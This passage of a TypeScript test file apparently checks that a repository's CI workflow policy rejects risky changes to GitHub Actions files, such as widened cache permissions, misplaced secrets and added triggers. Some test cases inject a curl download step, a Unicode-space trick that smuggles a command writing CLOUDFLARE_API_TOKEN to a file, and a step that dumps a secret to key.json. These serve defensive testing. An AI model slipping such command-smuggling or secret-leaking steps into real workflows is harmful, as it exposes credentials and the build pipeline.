  "312 one more step in the circuits job": [replace(CIRCUITS_WORKFLOW, "      - name: pnpm test", "      - run: curl -o .zkID/x https://example.invalid/x\n        working-directory: circuits\n      - name: pnpm test")],
  "313 a step of the circuits job in another directory": [replace(CIRCUITS_WORKFLOW, "        working-directory: circuits\n        run: ./rebuild.sh", "        working-directory: circuits/fuzz\n        run: ./rebuild.sh")],
  "314 the circuits job with an env": [replace(CIRCUITS_WORKFLOW, "    timeout-minutes: ", "    env:\n      ZKID_CIRCOM_BUILD: /tmp/x\n    timeout-minutes: ")],
};

// Spaces outside ASCII. libyaml takes none of them for a space, so a line that starts with them and
// then `#` is not a comment there but the next line of the value above it: `run` of the upload
// would end with the command after the `#` (review of #39, round 2).
for (const [label, cp] of [
  ["U+00A0", 0xa0],
  ["U+3000", 0x3000],
  ["U+2003", 0x2003],
] as const) {
  const ch = String.fromCodePoint(cp);
  CHANGES[`68 ${label} at the start of a line, then #, after the upload's run`] = [
    (f) => {
      f[D] += `${ch}${ch}#; echo "$CLOUDFLARE_API_TOKEN" > /tmp/x\n`;
    },
  ];
  CHANGES[`69 ${label} before # in an indented line`] = [replace(D, "      - name: Upload to iamreal-test\n", `          ${ch}#; node x.js\n      - name: Upload to iamreal-test\n`)];
  CHANGES[`70 ${label} between a key and its colon`] = [replace(C, "    timeout-minutes: 30\n", `    timeout-minutes${ch}: 30\n`)];
  CHANGES[`71 ${label} in a comment`] = [replace(C, "jobs:\n", `# a comment${ch}with it\njobs:\n`)];
}

// The upload of the iPhone app (#176): the key in the upload job's last step only, the job that
// runs the repository's code without it, started by hand only.
const U = "upload-ios.yml";
const IOS_KEY_ENV = "        env:\n          APP_STORE_CONNECT_API_KEY_P8: ${{ secrets.APP_STORE_CONNECT_API_KEY_P8 }}\n";
const IOS_ARCHIVE_STEP = "      - name: Archive the store's build and check it\n";
const IOS_UNPACK_STEP = "      - name: Unpack the archive\n";
Object.assign(CHANGES, {
  "ios-upload 1 triggered by a push to main too": [replace(U, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n    branches:\n      - main\n")],
  "ios-upload 2 triggered by a pull request instead": [replace(U, "on:\n  workflow_dispatch:\n", "on:\n  pull_request:\n")],
  "ios-upload 3 the build job in the environment that has the key": [replace(U, "  build:\n    runs-on: xcode-27\n", "  build:\n    runs-on: xcode-27\n    environment: app-test\n")],
  "ios-upload 4 the key given to the step that archives": [replace(U, `${IOS_ARCHIVE_STEP}        working-directory: ios\n`, `${IOS_ARCHIVE_STEP}        working-directory: ios\n${IOS_KEY_ENV}`)],
  "ios-upload 5 the upload job outside the environment": [replace(U, "    environment: app-test\n", "")],
  "ios-upload 6 the upload job checking out the repository and running a script of it": [
    replace(U, IOS_UNPACK_STEP, `      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Something of the repository\n        working-directory: ios\n        run: ./archive.sh x 1\n${IOS_UNPACK_STEP}`),
  ],
  "ios-upload 7 the key given to the step that unpacks": [replace(U, `${IOS_UNPACK_STEP}`, `${IOS_UNPACK_STEP}${IOS_KEY_ENV}`)],
  "ios-upload 8 the archive not checked": [replace(U, './archive.sh "$RUNNER_TEMP/IamrealApp.xcarchive" "$GITHUB_RUN_NUMBER"', 'xcodebuild archive -project IamrealApp.xcodeproj -scheme IamrealApp -archivePath "$RUNNER_TEMP/IamrealApp.xcarchive"')],
  "ios-upload 9 a run cancelling the one before": [replace(U, "  group: upload-ios\n  cancel-in-progress: false\n", "  group: upload-ios\n  cancel-in-progress: true\n")],
  "ios-upload 10 the default Xcode of the runner": [replace(U, "env:\n  # The one Xcode", "env:\n  DEVELOPER_DIR: /Applications/Xcode.app/Contents/Developer\n  # The one Xcode")],
  "ios-upload 11 the key written to a file other users of the runner can read": [replace(U, "        run: umask 077 && ", "        run: ")],
});

for (const [name, changes] of Object.entries(CHANGES)) {
  test(`turned away: ${name}`, () => {
    const files = realFiles();
    for (const change of changes) change(files);
    assert.notDeepEqual(workflowProblems(files), [], "the rules let this change through");
  });
}

// The caches (#203): only cache.yml, on pushes to main, may save one; checks.yml only restores;
// the other workflows use none. Each change here must be turned away for the reason given, not
// only because a job is no longer the one written in test/workflows.ts.
const K = "cache.yml";
const { registry: REGISTRY, target: TARGET } = DEVICE_CORE_CACHES;
const { gradleCaches: GRADLE } = ANDROID_CACHES;
const cacheStep = (action: string, cache: { readonly path: string; readonly key: string }): string => {
  const { sha, version } = ACTIONS["actions/cache"]!;
  return `      - uses: ${action}@${sha} # ${version}\n        with:\n          path: ${cache.path}\n          key: ${cache.key}\n`;
};
const GO_BUILD = "      - run: go build ./...\n";
const AFTER_CHECKOUT = "          persist-credentials: false\n";
const CHECKOUT = `      - uses: actions/checkout@${ACTIONS["actions/checkout"]!.sha} # ${ACTIONS["actions/checkout"]!.version}\n        with:\n${AFTER_CHECKOUT}`;
const ANDROID_STEPS_START = `  android:\n    needs: changes\n${jobIf("android")}    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    steps:\n${CHANGES_SUCCEEDED}${CHECKOUT}`;
const GRADLE_CLEANUP = `      - name: Leave Gradle's lock files and gc.properties out of the cache\n        run: find "$HOME/.gradle/caches" -type f \\( -name "*.lock" -o -name gc.properties \\) -delete\n`;
const NOT_ONLY_MAIN = /^cache\.yml: saves a cache and is not triggered by a push to main only/;
const CACHE_CHANGES: Record<string, { changes: Change[]; problem: RegExp }> = {
  "150 a job of checks.yml with the action that also saves": {
    changes: [replace(C, GO_BUILD, `${cacheStep("actions/cache", REGISTRY)}${GO_BUILD}`)],
    problem: /^checks\.yml: line \d+: uses actions\/cache, which saves a cache: this workflow may only restore one/,
  },
  "151 a job of checks.yml with the action that only saves": {
    changes: [replace(C, GO_BUILD, `${GO_BUILD}${cacheStep("actions/cache/save", REGISTRY)}`)],
    problem: /^checks\.yml: line \d+: uses actions\/cache\/save, which saves a cache: this workflow may only restore one/,
  },
  "152 deploy-test.yml restoring a cache, so that what is deployed depends on it": {
    changes: [replace(D, AFTER_CHECKOUT, `${AFTER_CHECKOUT}${cacheStep("actions/cache/restore", REGISTRY)}`)],
    problem: /^deploy-test\.yml: line \d+: uses actions\/cache\/restore: this workflow may use no cache/,
  },
  "153 checks-browser.yml restoring a cache": {
    changes: [replace(B, AFTER_CHECKOUT, `${AFTER_CHECKOUT}${cacheStep("actions/cache/restore", REGISTRY)}`)],
    problem: /^checks-browser\.yml: line \d+: uses actions\/cache\/restore: this workflow may use no cache/,
  },
  "154 checks-ios.yml with the action that also saves": {
    changes: [replace(I, AFTER_CHECKOUT, `${AFTER_CHECKOUT}${cacheStep("actions/cache", TARGET)}`)],
    problem: /^checks-ios\.yml: line \d+: uses actions\/cache: this workflow may use no cache/,
  },
  "155 cache.yml also on pull_request, where a pull request's code would run before the save": {
    changes: [replace(K, "on:\n  push:\n", "on:\n  pull_request:\n  push:\n")],
    problem: NOT_ONLY_MAIN,
  },
  "156 cache.yml on a push to any branch": {
    changes: [replace(K, "  push:\n    branches:\n      - main\n", "  push:\n")],
    problem: NOT_ONLY_MAIN,
  },
  "157 cache.yml also on merge_group, whose branch holds a pull request's change": {
    changes: [replace(K, "on:\n", `on:\n${MERGE_GROUP}`)],
    problem: NOT_ONLY_MAIN,
  },
  "158 cache.yml also started by hand, on any branch": {
    changes: [replace(K, "on:\n", "on:\n  workflow_dispatch:\n")],
    problem: NOT_ONLY_MAIN,
  },
  "159 cache.yml in the concurrency group of the deploy, which would then wait for it": {
    changes: [replace(K, "  group: cache\n", "  group: deploy-test\n")],
    problem: /^cache\.yml: concurrency is not group cache, one run at a time and none cancelled/,
  },
  "160 a secret in cache.yml, which the step that saves would hold": {
    changes: [replace(K, "    timeout-minutes: 30\n", `    timeout-minutes: 30\n    env:\n      T: ${SECRET}\n`)],
    problem: /^the lines with "secrets" in them are /,
  },
  "161 cache.yml with a token that can write": {
    changes: [replace(K, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
    problem: /^cache\.yml: permissions is not exactly contents: read/,
  },
  "162 cache.yml with one more permission (actions: write can delete caches)": {
    changes: [replace(K, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: write\n")],
    problem: /^cache\.yml: permissions is not exactly contents: read/,
  },
  "163 a job of cache.yml with its own permissions": {
    changes: [replace(K, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    permissions:\n      contents: write\n")],
    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
  },
  "164 one more step in cache.yml before the save": {
    changes: [replace(K, "      - name: cargo clippy\n", "      - run: curl -o target/x https://example.invalid/x\n        working-directory: device-core\n      - name: cargo clippy\n")],
    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
  },
  "165 a cache of checks.yml restored by the start of its key, so for another Cargo.lock or another Rust": {
    changes: [replace(C, "          path: device-core/target\n", "          path: device-core/target\n          restore-keys: device-core-target-\n")],
    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
  },
  "166 a cache of checks.yml with a key that leaves out the files": {
    changes: [replace(C, `          key: ${TARGET.key}\n`, "          key: device-core-target\n")],
    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
  },
  "167 a restored cache that fails the check when there is none": {
    changes: [replace(C, "          path: device-core/target\n", "          path: device-core/target\n          fail-on-cache-miss: true\n")],
    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
  },
  "169 a job of checks.yml other than device-core restoring device-core's cache": {
    changes: [replace(C, GO_BUILD, `${cacheStep("actions/cache/restore", TARGET)}${GO_BUILD}`)],
    problem: /^checks\.yml: job go: step \d+: restores a cache that is not this job's/,
  },
  // cache-mode: what the cache service lets a job do, whatever its steps are.
  "170 checks.yml with no cache-mode, so with whatever the trigger's default is": {
    changes: [(f) => void (f[C] = f[C]!.replace(/^cache-mode: .*\n\n/m, ""))],
    problem: /^checks\.yml: cache-mode is not read/,
  },
  "171 checks.yml allowed to save caches": {
    changes: [(f) => void (f[C] = f[C]!.replace(/^cache-mode: .*$/m, "cache-mode: write"))],
    problem: /^checks\.yml: cache-mode is not read/,
  },
  "172 deploy-test.yml allowed to restore caches": {
    changes: [(f) => void (f[D] = f[D]!.replace(/^cache-mode: .*$/m, "cache-mode: read"))],
    problem: /^deploy-test\.yml: cache-mode is not none/,
  },
  "173 deploy-test.yml with no cache-mode": {
    changes: [(f) => void (f[D] = f[D]!.replace(/^cache-mode: .*\n\n/m, ""))],
    problem: /^deploy-test\.yml: cache-mode is not none/,
  },
  "174 checks-browser.yml with no cache-mode": {
    changes: [(f) => void (f[B] = f[B]!.replace(/^cache-mode: .*\n\n/m, ""))],
    problem: /^checks-browser\.yml: cache-mode is not none/,
  },
  "180 checks-circuits.yml with no cache-mode": {
    changes: [(f) => void (f[CIRCUITS_WORKFLOW] = f[CIRCUITS_WORKFLOW]!.replace(/^cache-mode: .*\n\n/m, ""))],
    problem: /^checks-circuits\.yml: cache-mode is not none/,
  },
  "181 checks-circuits.yml restoring a cache": {
    changes: [replace(CIRCUITS_WORKFLOW, "      - name: Install pnpm\n", `${cacheStep("actions/cache/restore", TARGET)}      - name: Install pnpm\n`)],
    problem: /^checks-circuits\.yml: line \d+: uses actions\/cache\/restore: this workflow may use no cache/,
  },
  "175 checks-ios.yml allowed to save caches": {
    changes: [(f) => void (f[I] = f[I]!.replace(/^cache-mode: .*$/m, "cache-mode: write-only"))],
    problem: /^checks-ios\.yml: cache-mode is not none/,
  },
  "176 cache.yml with no cache-mode": {
    changes: [(f) => void (f[K] = f[K]!.replace(/^cache-mode: .*\n\n/m, ""))],
    problem: /^cache\.yml: cache-mode is not write/,
  },
  "177 a job of checks.yml with its own cache-mode, which overrides the workflow's": {
    changes: [replace(C, GO_JOB, `${GO_JOB}    cache-mode: write\n`)],
    problem: /^checks\.yml: line \d+: cache-mode below the top level/,
  },
  "178 a job of deploy-test.yml with its own cache-mode": {
    changes: [replace(D, BUILD_JOB, `${BUILD_JOB}    cache-mode: read\n`)],
    problem: /^deploy-test\.yml: line \d+: cache-mode below the top level/,
  },
  "179 a new workflow with no cache-mode": {
    changes: [addFile("other.yml", "name: other\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
    problem: /^other\.yml: cache-mode is not none/,
  },
  "168 a new workflow that saves a cache": {
    changes: [addFile("cache-2.yml", `name: cache-2\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n${cacheStep("actions/cache", TARGET)}`)],
    problem: /^cache-2\.yml: line \d+: uses actions\/cache: this workflow may use no cache/,
  },
  // android's caches (#207): its own, with keys that hash every file deciding what is in them.
  "190 the android job restoring device-core's target/, built by other commands": {
    changes: [replace(C, ANDROID_STEPS_START, `${ANDROID_STEPS_START}${cacheStep("actions/cache/restore", TARGET)}`)],
    problem: /^checks\.yml: job android: step 2: actions\/cache\/restore is not given exactly /,
  },
  "191 the device-core job restoring android's Gradle cache": {
    changes: [replace(C, `          path: ${TARGET.path}\n          key: ${TARGET.key}\n`, `          path: ${GRADLE.path}\n          key: ${GRADLE.key}\n`)],
    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
  },
  "192 an android cache whose key leaves out verification-metadata.xml, so that other libraries get the old cache": {
    changes: [replace(C, ", 'android/gradle/verification-metadata.xml'", "")],
    problem: /^checks\.yml: job android: step 2: actions\/cache\/restore is not given exactly /,
  },
  "193 an android cache restored by the start of its key, so for other libraries or another Gradle": {
    changes: [replace(C, `          key: ${GRADLE.key}\n`, `          key: ${GRADLE.key}\n          restore-keys: android-gradle-caches-\n`)],
    problem: /^checks\.yml: job android: step \d+: actions\/cache\/restore is not given exactly /,
  },
  "194 the whole Gradle home restored, with its init scripts and properties": {
    changes: [replace(C, `          path: ${GRADLE.path}\n`, "          path: ~/.gradle\n")],
    problem: /^checks\.yml: job android: step \d+: actions\/cache\/restore is not given exactly /,
  },
  "195 cache.yml's android job leaving a Gradle daemon running while the caches are saved": {
    changes: [replace(K, "./gradlew --no-daemon build", "./gradlew build")],
    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
  },
  "196 cache.yml's android job building with another JDK than the check, which then reuses nothing": {
    changes: [replace(K, "$JAVA_HOME_17_X64", "$JAVA_HOME_21_X64")],
    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
  },
  "197 cache.yml's android job saving Gradle's lock files and gc.properties": {
    changes: [replace(K, GRADLE_CLEANUP, "")],
    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
  },
  "198 cache.yml's android job deleting more than Gradle's lock files before the save": {
    changes: [replace(K, 'find "$HOME/.gradle/caches"', 'find "$HOME/.gradle"')],
    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
  },
};

for (const [name, { changes, problem }] of Object.entries(CACHE_CHANGES)) {
  test(`turned away: ${name}`, () => {
    const files = realFiles();
    for (const change of changes) change(files);
    const problems = workflowProblems(files);
    assert.ok(
      problems.some((p) => problem.test(p)),
      `no problem like ${problem}: ${JSON.stringify(problems)}`,
    );
  });
}

// upload-android.yml (#175): by hand, on main; the build job has no secret and the upload job runs no build.
const A = "upload-android.yml";
const SIGN_ENV = "        env:\n          ANDROID_UPLOAD_KEYSTORE_BASE64: ${{ secrets.ANDROID_UPLOAD_KEYSTORE_BASE64 }}\n          ANDROID_UPLOAD_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_UPLOAD_KEYSTORE_PASSWORD }}\n";
const PLAY_ENV = "        env:\n          PLAY_SERVICE_ACCOUNT_JSON: ${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}\n";
const BUNDLE_RELEASE = '        run: JAVA_HOME="$JAVA_HOME_17_X64" ./gradlew --no-daemon bundleRelease';
const UPLOAD_JOBS_PROBLEM = /^upload-android\.yml: the jobs are not exactly the ones in test\/workflows\.ts/;
const SECRETS_PROBLEM = /^the lines with "secrets" in them are/;

const UPLOAD_ANDROID_CHANGES: Record<string, { changes: Change[]; problem: RegExp }> = {
  "250 upload-android.yml started by a push to main too": {
    changes: [replace(A, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n    branches:\n      - main\n")],
    problem: /^upload-android\.yml: not triggered by hand \(workflow_dispatch\) only/,
  },
  "251 upload-android.yml started by another workflow (workflow_run)": {
    changes: [replace(A, "on:\n  workflow_dispatch:\n", "on:\n  workflow_run:\n    workflows:\n      - deploy-test\n")],
    problem: /^upload-android\.yml: not triggered by hand \(workflow_dispatch\) only/,
  },
  "252 upload-android.yml taking inputs from whoever starts it": {
    changes: [replace(A, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n    inputs:\n      track:\n        default: production\n")],
    problem: /^upload-android\.yml: not triggered by hand \(workflow_dispatch\) only/,
  },
  "253 the upload key given to the build job, where Gradle runs": {
    changes: [replace(A, `${BUNDLE_RELEASE}`, `${SIGN_ENV.replace("        env:\n", "")}${BUNDLE_RELEASE}`)],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "254 the build job in the environment app-test": {
    changes: [replace(A, "  build:\n    runs-on: ubuntu-24.04\n", "  build:\n    environment: app-test\n    runs-on: ubuntu-24.04\n")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "255 the upload job out of the environment app-test (its secrets would be the repository's, on any branch)": {
    changes: [replace(A, "    environment: app-test\n", "")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "256 the upload job building the app itself, with the keys in reach": {
    changes: [replace(A, "      - name: Sign the bundle with the upload key\n", "      - name: Build again\n        working-directory: android\n        run: ./gradlew bundleRelease\n      - name: Sign the bundle with the upload key\n")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "257 the upload key in the env of the upload to Google Play too": {
    changes: [replace(A, PLAY_ENV, `${PLAY_ENV}          ANDROID_UPLOAD_KEYSTORE_PASSWORD: \${{ secrets.ANDROID_UPLOAD_KEYSTORE_PASSWORD }}\n`)],
    problem: SECRETS_PROBLEM,
  },
  "258 the service account's key put into the command": {
    changes: [replace(A, 'run: bash .github/workflows/play-upload.sh "$RUNNER_TEMP/signed/app-release.aab"', 'run: echo "${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}" > key.json && bash .github/workflows/play-upload.sh "$RUNNER_TEMP/signed/app-release.aab"')],
    problem: SECRETS_PROBLEM,
  },
  "259 the build job's token given more than the workflow's": {
    changes: [replace(A, "  build:\n    runs-on: ubuntu-24.04\n", "  build:\n    permissions:\n      actions: write\n    runs-on: ubuntu-24.04\n")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "260 the upload job's token able to write the code": {
    changes: [replace(A, "    environment: app-test\n", "    environment: app-test\n    permissions:\n      contents: write\n")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "261 the build job not stopping off main": {
    changes: [replace(A, '      - name: Only from main\n        run: test "$GITHUB_REF" = refs/heads/main\n', "")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
  "262 an upload cancelled halfway by the next": {
    changes: [replace(A, "  group: upload-android\n  cancel-in-progress: false\n", "  group: upload-android\n  cancel-in-progress: true\n")],
    problem: /^upload-android\.yml: concurrency is not group upload-android/,
  },
  "263 a cache restored in the build job": {
    changes: [replace(A, "      - name: Get the parameter files\n", "      - uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0\n        with:\n          path: ~/.gradle/caches\n          key: x\n      - name: Get the parameter files\n")],
    problem: /^upload-android\.yml: line \d+: uses actions\/cache\/restore: this workflow may use no cache/,
  },
  "264 a step of the upload job continuing when signing fails": {
    changes: [replace(A, "      - name: Sign the bundle with the upload key\n", "      - name: Sign the bundle with the upload key\n        continue-on-error: true\n")],
    problem: UPLOAD_JOBS_PROBLEM,
  },
};

for (const [name, { changes, problem }] of Object.entries(UPLOAD_ANDROID_CHANGES)) {
  test(`turned away: ${name}`, () => {
    const files = realFiles();
    for (const change of changes) change(files);
    const problems = workflowProblems(files);
    assert.ok(
      problems.some((p) => problem.test(p)),
      `no problem like ${problem}: ${JSON.stringify(problems)}`,
    );
  });
}

test("every file the caches' keys hash is there: hashFiles would leave a misspelt one out of the key without a word", () => {
  for (const f of CACHE_KEY_FILES) assert.ok(existsSync(join(REPO, f)), `${f} is not in the repository`);
  for (const cache of [...Object.values(DEVICE_CORE_CACHES), ...Object.values(ANDROID_CACHES)]) {
    const hashed = [...cache.key.matchAll(/'([^']+)'/g)].map((m) => m[1]!);
    assert.ok(hashed.length > 1, cache.key);
    for (const f of hashed) assert.ok(CACHE_KEY_FILES.includes(f), `${f}, in the key of ${cache.path}, is not in CACHE_KEY_FILES`);
  }
});

test("the reader reads the part of YAML the workflows are written in, values as written", () => {
  const doc = readYaml(realFiles()[C]!) as Record<string, Yaml>;
  assert.deepEqual(doc.on, CHECKS_ON);
  assert.deepEqual(Object.keys(doc.jobs as object), [CHANGES_JOB, ...REQUIRED_CHECKS]);
  const browserDoc = readYaml(realFiles()[B]!) as Record<string, Yaml>;
  // `paths`: a list of strings under pull_request, each as written (`**` is no special character in YAML here).
  const paths = (browserDoc.on as Record<string, Record<string, Yaml>>).pull_request!.paths as string[];
  assert.equal(paths[0], "web/**");
  assert.equal(paths.at(-1), ".github/workflows/checks-browser.yml");
  assert.deepEqual(Object.keys(browserDoc.jobs as object), ["browser"]);
  const iosDoc = readYaml(realFiles()[I]!) as Record<string, Yaml>;
  assert.deepEqual((iosDoc.on as Record<string, Record<string, Yaml>>).pull_request!.paths, [...IOS_PATHS]);
  assert.deepEqual(Object.keys(iosDoc.jobs as object), ["ios"]);
  const circuitsDoc = readYaml(realFiles()[CIRCUITS_WORKFLOW]!) as Record<string, Yaml>;
  assert.deepEqual((circuitsDoc.on as Record<string, Record<string, Yaml>>).pull_request!.paths, [...CIRCUITS_PATHS]);
  assert.deepEqual(Object.keys(circuitsDoc.jobs as object), ["circuits"]);
  const browser = (browserDoc.jobs as Record<string, Record<string, Yaml>>).browser!;
  assert.deepEqual(browser.env, { CHROME: "/usr/bin/google-chrome" });
  assert.ok((browser.steps as Record<string, Yaml>[]).some((s) => s.run === '"$CHROME" --version'));
  assert.deepEqual(readYaml("a: 'it''s # not a comment' # a comment\nb:\n  - x\n  - y: z\n    w: v\n"), { a: "it's # not a comment", b: ["x", { y: "z", w: "v" }] });
});

test("every job of checks.yml uses the bb of bb.js 6.0.0: the SHA-256 it checks is that file's", () => {
  // The package is installed for worker/ too (its devDependency), with every platform's bb in it.
  const bb = join(WORKER_DIR, "node_modules", "@aztec-foundation", "bb.js", "build", "amd64-linux", "bb");
  const pkg = JSON.parse(readFileSync(join(WORKER_DIR, "node_modules", "@aztec-foundation", "bb.js", "package.json"), "utf8")) as { version: string };
  assert.equal(pkg.version, "6.0.0");
  assert.equal(createHash("sha256").update(readFileSync(bb)).digest("hex"), BB_AMD64_LINUX_SHA256);
  assert.ok(realFiles()[C]!.includes(`run: ${CHECK_BB}`));
  assert.ok(INSTALL_PNPM.includes("--registry=https://registry.npmjs.org/"));
});

test("deploying runs no command of the repository: the wrangler configuration has no build command", () => {
  // wrangler runs `build.command` before it uploads, with --no-bundle too: getEntry
  // (src/deployment-bundle/entry.ts in wrangler 4.160.1) calls runCustomBuild whatever the flag,
  // and Cloudflare's documentation says the command "will be run as part of `wrangler dev` and
  // `npx wrangler deploy`" (https://developers.cloudflare.com/workers/wrangler/custom-builds/).
  // A command there would run in the step that has the token.
  const config = unstable_readConfig({ config: join(WORKER_DIR, "wrangler.jsonc"), env: "test" });
  assert.equal(config.build.command, undefined);
});

test("the Gradle wrapper of android/ is the one of the Gradle it names: its jar and the distribution's SHA-256 are the published ones", () => {
  const wrapper = join(REPO, "android", "gradle", "wrapper");
  assert.equal(createHash("sha256").update(readFileSync(join(wrapper, "gradle-wrapper.jar"))).digest("hex"), GRADLE_WRAPPER_JAR_SHA256);
  // The whole file, line by line: a second distributionUrl, however it is spelled, is a line more.
  assert.deepEqual(readFileSync(join(wrapper, "gradle-wrapper.properties"), "utf8").split("\n"), [
    "distributionBase=GRADLE_USER_HOME",
    "distributionPath=wrapper/dists",
    `distributionSha256Sum=${GRADLE_DISTRIBUTION_SHA256}`,
    `distributionUrl=https\\://services.gradle.org/distributions/gradle-${GRADLE_VERSION}-bin.zip`,
    "networkTimeout=10000",
    "retries=0",
    "retryBackOffMs=500",
    "validateDistributionUrl=true",
    "zipStoreBase=GRADLE_USER_HOME",
    "zipStorePath=wrapper/dists",
    "",
  ]);
  // Every plugin and library Gradle downloads is checked against the SHA-256 in the repository:
  // no signature stands in for one, and nothing is exempt.
  const verification = readFileSync(join(REPO, "android", "gradle", "verification-metadata.xml"), "utf8");
  assert.ok(verification.includes("<verify-metadata>true</verify-metadata>"));
  assert.ok(verification.includes("<verify-signatures>false</verify-signatures>"));
  assert.ok(!/<trust|<ignored-key|<key-server/.test(verification), "no artifact is exempt from the check");
  assert.ok(!/<(md5|sha1|pgp)\b/.test(verification), "SHA-256 only");
  // The parts of the SDK the job installs are the ones the build names.
  const build = readFileSync(join(REPO, "android", "app", "build.gradle.kts"), "utf8");
  const named = (re: RegExp): string => re.exec(build)![1]!;
  assert.ok(ANDROID_SDK_PARTS.includes(`"ndk;${named(/ndkVersion = "([^"]+)"/)}"`));
  assert.ok(ANDROID_SDK_PARTS.includes(`"platforms;android-${named(/compileSdk = (\d+)/)}"`));
  assert.ok(ANDROID_SDK_PARTS.includes(`"build-tools;${named(/buildToolsVersion = "([^"]+)"/)}"`));
});

test("no file in the repository changes what the deploy job installs or what wrangler loads", () => {
  // .npmrc: where pnpm and npm fetch from, and pnpm's settings. .pnpmfile.cjs: code pnpm runs
  // while installing (the deploy job passes --ignore-pnpmfile too). worker/.env*: wrangler loads
  // them unless --env-file names others (scripts/deploy.ts). patches/: pnpm's patches of packages.
  const tracked = execFileSync("git", ["-C", REPO, "ls-files", "-z"], { encoding: "utf8" }).split("\0").filter(Boolean);
  assert.ok(tracked.includes("pnpm-lock.yaml"), "the check read the tracked files");
  assert.deepEqual(
    tracked.filter((f) => /(^|\/)\.npmrc$|(^|\/)\.pnpmfile\.c?js$|(^|\/)\.pnpmfile\.mjs$|^worker\/(.*\/)?\.env[^/]*$|^patches\//.test(f)),
    [],
  );
});

test("pnpm-workspace.yaml and the lockfile hold no setting that changes the packages installed", () => {
  // patchedDependencies, overrides, packageExtensions, pnpmfile, configDependencies and the like
  // would change wrangler as the deploy job installs it; tried: a patch of wrangler in
  // pnpm-workspace.yaml and the lockfile is applied under --ignore-scripts --ignore-pnpmfile.
  const workspace = readYaml(readFileSync(join(REPO, "pnpm-workspace.yaml"), "utf8")) as Record<string, Yaml>;
  assert.deepEqual(Object.keys(workspace), ["packages", "minimumReleaseAge", "ignoredBuiltDependencies"]);
  const lockKeys = readFileSync(join(REPO, "pnpm-lock.yaml"), "utf8")
    .split("\n")
    .filter((l) => /^[^\s#]/.test(l))
    .map((l) => l.replace(/:.*$/, ""));
  assert.deepEqual(lockKeys, ["lockfileVersion", "settings", "importers", "packages", "snapshots"]);
});

function filesUnder(dir: string): string[] {
  return readdirSync(dir).flatMap((f) => {
    const p = join(dir, f);
    return statSync(p).isDirectory() ? filesUnder(p) : [p];
  });
}

/** The workspace's packages (pnpm-workspace.yaml): each one's name in its package.json, and its directory. */
function workspacePackages(): Map<string, string> {
  const workspace = readYaml(readFileSync(join(REPO, "pnpm-workspace.yaml"), "utf8")) as { packages: string[] };
  const found = new Map<string, string>();
  for (const dir of workspace.packages) {
    const pkg = JSON.parse(readFileSync(join(REPO, dir, "package.json"), "utf8")) as { name: string };
    found.set(pkg.name, join(REPO, dir));
  }
  assert.ok(found.size > 1, "the check read the workspace's packages");
  return found;
}

/**
 * What the browser tests (web/'s `pnpm test:e2e`, `pnpm test:ui` and
 * `pnpm test:worker`: test/e2e/run.ts, test/e2e/ui.ts and
 * test/worker-card-proof.ts) use, found by reading their source, from every
 * file of web/src/, web/test/e2e/, test/worker-card-proof.ts,
 * web/vite.config.ts and the pages' HTML in web/ (Vite builds the page
 * from them), and the files those import (the Worker's test harness among
 * them, and through it the Worker's scripts and code):
 *
 * - `files`: the files reached by an import written `from "…"`,
 *   `import("…")` or `import "…"` with a relative path (JSON included), or
 *   with the name of a package of the workspace (`iamreal-protocol/…` is
 *   protocol/src/…); and by the HTML's `<script src>`;
 * - `named`: the top-level directories in `join(repo, "<dir>"…)`,
 *   `join(web, "..", "<dir>"…)`, `join(web, "../<dir>"…)` (each also broken
 *   over lines), `new URL("../…", import.meta.url)`, and the directory of a
 *   workspace package imported by name;
 * - `goPackages`: the packages in `"go", [… "./<package>"`.
 *
 * Not seen (tried in the review of #123): a path written as a template
 * string (`${repo}/docs`), joined with `+`, or put together some other way
 * when the tests run; an import with a query (`?raw`); CSS `@import`; a Go
 * package named through a variable; what the programs the tests start read
 * at run time (wrangler, which bundles the Worker from worker/ and reads
 * worker/wrangler.jsonc and worker/site/: all of worker/ is in the paths;
 * iamreal-verify reads only the directories the test hands it); npm packages (the lockfile stands for them); the tools on the runner
 * (Chrome, Go, bb). So this is one more reminder, not the list: whoever
 * makes the tests use another directory adds it to the paths.
 */
/**
 * What one source's text names, as written there: the specifiers of its
 * imports (`from "..."`, `import("...")`, `import "..."`) and of the HTML's
 * `<script src>` (from the root of web/, written `./...`), the paths of
 * `new URL("../...", import.meta.url)` up to the first `${`, and the
 * packages of `"go", [... "./<package>"`. The one place these writings are
 * read, for the browser tests' paths and for the typescript check's.
 */
